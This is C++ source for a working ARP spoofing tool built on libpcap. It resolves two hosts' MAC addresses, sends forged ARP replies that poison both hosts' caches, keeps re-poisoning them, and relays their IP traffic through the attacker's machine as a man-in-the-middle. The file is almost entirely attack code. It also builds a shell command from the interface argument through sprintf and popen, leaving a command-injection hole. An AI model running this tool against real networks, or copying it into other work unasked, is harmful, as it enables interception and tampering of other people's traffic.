#include <pcap.h>   // pcap libc
#include <unistd.h>
#include <iostream>
#include <cstdlib>
#include <cstring>
#include <netinet/ether.h> // find_me()
#include <net/ethernet.h>   // find_me()
#include <arpa/inet.h>  // inet libc
#include <thread>       // Thread libc
#include "psy_header.h"     // header define
using namespace std;

#define PKT_SIZE (sizeof(eth_header)+sizeof(arp_header))

uint8_t find_chk_S = 0;
uint8_t find_chk_T = 0;

char FILTER_RULE[BUF_SIZ] = "ether dst ";
pcap_t *use_dev;
struct ether_addr my_mac;
struct sockaddr_in my_ip;
struct sockaddr_in G_Sender_ip;
struct sockaddr_in G_Target_ip;
uint8_t sender_mac[6];
uint8_t target_mac[6];

void err_print(int err_num)
{
    switch(err_num)
    {
    case 0:
        cout <<"ARP_Spoofing [Interface] [Sender_IP] [Target_IP]" <<endl;
        break;
    case 1:
        cout <<"PCAP_OPEN_ERROR!\n" <<endl;
        break;
    case 2:
        cout <<"PCAP_COMPILE_ERROR!\n" <<endl;
        break;
    case 3:
        cout <<"PCAP_SET_FILTER_ERROR!\n"<<endl;
        break;
    case 4:
        cout <<"THREAD_CREATE_ERROR!\n"<<endl;
        break;
    default:
        cout <<"Unknown ERROR!\n"<<endl;
        break;

    }
}

void send_Req_arp(char *sender_ip,char *target_ip)
{
    struct mine m;
    uint8_t packet[PKT_SIZE];
    inet_aton(target_ip,&G_Target_ip.sin_addr);
    inet_aton(sender_ip,&G_Sender_ip.sin_addr);

    while(!find_chk_T||!find_chk_S) // Not Find S or T
    {
        memcpy(m.src_mac,my_mac.ether_addr_octet,6);
        memcpy(m.s_mac,my_mac.ether_addr_octet,6);
        m.oper=0x0100;
        m.s_ip=my_ip.sin_addr;
        m.t_ip=G_Sender_ip.sin_addr;
        memcpy(packet,&m,PKT_SIZE);

        //sender_BROADCAST
        if(pcap_sendpacket(use_dev,packet,PKT_SIZE)!=0)
        {
            printf("SEND PACKET ERROR!\n");
            exit(1);
        }

        m.t_ip=G_Target_ip.sin_addr;
        memcpy(packet,&m,PKT_SIZE);

        //target_BROADCAST
        if(pcap_sendpacket(use_dev,packet,PKT_SIZE)!=0)
        {
            printf("SEND PACKET ERROR!\n");
            exit(1);
        }
        sleep(1);
    }
}

void send_infect_arp(const u_int8_t *pkt_data, u_int8_t chk_first)
{
    struct mine m_S;
    struct mine m_T;
    struct eth_header *eh;
    uint8_t packet[PKT_SIZE];

    eh = (struct eth_header *)pkt_data;

    // Sender_Infection_setting
    memcpy(m_S.des_mac,sender_mac,6);
    memcpy(m_S.src_mac,my_mac.ether_addr_octet,6);
    m_S.s_ip=G_Target_ip.sin_addr;
    memcpy(m_S.s_mac,my_mac.ether_addr_octet,6);
    m_S.t_ip=G_Sender_ip.sin_addr;
    memcpy(m_S.t_mac,sender_mac,6);

    // Target_Infection_setting
    memcpy(m_T.des_mac,target_mac,6);
    memcpy(m_T.src_mac,my_mac.ether_addr_octet,6);
    m_T.s_ip=G_Sender_ip.sin_addr;
    memcpy(m_T.s_mac,my_mac.ether_addr_octet,6);
    m_T.t_ip=G_Target_ip.sin_addr;
    memcpy(m_T.t_mac,target_mac,6);

    if(chk_first)
    {
        memcpy(packet,&m_S,PKT_SIZE);
       if(pcap_sendpacket(use_dev,packet,PKT_SIZE)!=0)
            {
                printf("SEND_PACKET_ERROR!\n");
                exit(1);
            }

       memcpy(packet,&m_T,PKT_SIZE);
       if(pcap_sendpacket(use_dev,packet,PKT_SIZE)!=0)
            {
                printf("SEND_PACKET_ERROR!\n");
                exit(1);
            }
       cout<< "SEND_INFECTION_ARP!\n"<<endl;
    }


    if( (!(memcmp(eh->src_mac,sender_mac,6))) || (!(memcmp(eh->src_mac,target_mac,6))) )
    {
        memcpy(packet,&m_S,PKT_SIZE);
       if(pcap_sendpacket(use_dev,packet,PKT_SIZE)!=0)
            {
                printf("SEND_PACKET_ERROR!\n");
                exit(1);
            }

       memcpy(packet,&m_T,PKT_SIZE);
       if(pcap_sendpacket(use_dev,packet,PKT_SIZE)!=0)
            {
                printf("SEND_PACKET_ERROR!\n");
                exit(1);
            }
       cout<< "SEND_RECOVERY_ARP!\n"<<endl;
    }
}

void pkt_relay(const u_int8_t *pkt_data,bpf_u_int32 caplen)
{
    struct eth_header *eh;
    eh = (struct eth_header *)pkt_data;

        if(!(memcmp(eh->src_mac,sender_mac,sizeof(eh->src_mac))))
        {
            cout << "Sender PKT IN ::"<<endl;
            memcpy(eh->src_mac,my_mac.ether_addr_octet,sizeof(eh->src_mac));
            memcpy(eh->des_mac,target_mac,sizeof(eh->des_mac));

        }
        if(!(memcmp(eh->src_mac,target_mac,sizeof(eh->src_mac))))
        {
            cout << "Target PKT IN ::"<<endl;
            memcpy(eh->src_mac,my_mac.ether_addr_octet,sizeof(eh->src_mac));
            memcpy(eh->des_mac,sender_mac,sizeof(eh->des_mac));
        }

    pcap_sendpacket(use_dev,pkt_data,caplen);
}

void init_dev(char *dev_name)
{
    char errbuf[ERRBUF_SIZ];
    struct bpf_program rule_struct;

    if((use_dev=pcap_open_live(dev_name,SNAPLEN,1,1000,errbuf))==NULL)
    {
        err_print(1);
        exit(1);
    }

    if(pcap_compile(use_dev,&rule_struct,FILTER_RULE,1,NULL)<0)
    {
        err_print(2);
        exit(1);
    }
    if(pcap_setfilter(use_dev,&rule_struct)<0)
    {
        err_print(3);
        exit(1);
    }
     cout <<":: DEVICE SETTING SUCCESS ::"<<endl;
}

void find_mac(const uint8_t *pkt_data,char *sender_ip,char *target_ip)
{
    struct arp_header *ah;
    ah = (struct arp_header *)pkt_data;

    struct sockaddr_in sender;
    struct sockaddr_in target;

    inet_aton(sender_ip,&sender.sin_addr);
    inet_aton(target_ip,&target.sin_addr);

    if(ah->s_ip.s_addr == sender.sin_addr.s_addr)
    {
        memcpy(sender_mac,ah->s_mac,sizeof(ah->s_mac));

        cout << "SENDER_FIND!\nSENDER_MAC : ";
        for(int i=0; i<6; i++)
            printf("%02X ",sender_mac[i]);
        cout <<"\n"<<endl;
        find_chk_S = 1;
    }

    if(ah->s_ip.s_addr == target.sin_addr.s_addr)
    {
        memcpy(target_mac,ah->s_mac,sizeof(ah->s_mac));

        cout << "TARGET_MAC FIND!\nTARGET_MAC : ";
        for(int i=0; i<6; i++)
            printf("%02X ",target_mac[i]);
        cout <<"\n"<<endl;
        find_chk_T=1;
    }

    if(find_chk_S && find_chk_T) send_infect_arp(pkt_data,1);
}

void find_me(char *dev_name)
{
    FILE *ptr;
    char MAC[20];
    char IP[20]={0,};
    char cmd[300]={0x0};

    //MY_MAC FIND
    sprintf(cmd,"ifconfig %s | grep HWaddr | awk '{print $5}'",dev_name);
    ptr = popen(cmd, "r");
    fgets(MAC, sizeof(MAC), ptr);
    pclose(ptr);
    ether_aton_r(MAC, &my_mac);
    strcat(FILTER_RULE,MAC);

    //MY_IP FIND
    sprintf(cmd,"ifconfig %s | egrep 'inet addr:' | awk '{print $2}'",dev_name);
    ptr = popen(cmd, "r");
    fgets(IP, sizeof(IP), ptr);
    pclose(ptr);
    inet_aton(IP+5,&my_ip.sin_addr);
}

void cap_pkt(char *sender_ip,char *target_ip)
{
    struct pcap_pkthdr *header;
    const uint8_t *pkt_data;
    int res;
    struct eth_header *eh;
    u_int16_t eth_type;
   while((res = pcap_next_ex(use_dev,&header,&pkt_data))>=0)
    {
        if(res == 0) continue;
        eh = (struct eth_header *)pkt_data;
        eth_type = ntohs(eh->eth_type);

        if(find_chk_S && find_chk_T && eth_type == 0x0806) send_infect_arp(pkt_data,0);
        else if (find_chk_S && find_chk_T && eth_type == 0x0800) pkt_relay(pkt_data,header->caplen);

        pkt_data += sizeof(struct eth_header);
        if(!find_chk_S || !find_chk_T) find_mac(pkt_data,sender_ip,target_ip);
    }
}

int main(int argc, char **argv)
{
    if(argc != 4)
    {
        err_print(0);
        return -1;
    }
    find_me(argv[1]);
    init_dev(argv[1]);
    thread t1(cap_pkt,argv[2],argv[3]);
    send_Req_arp(argv[2],argv[3]);

    t1.join();
    pcap_close(use_dev);
}
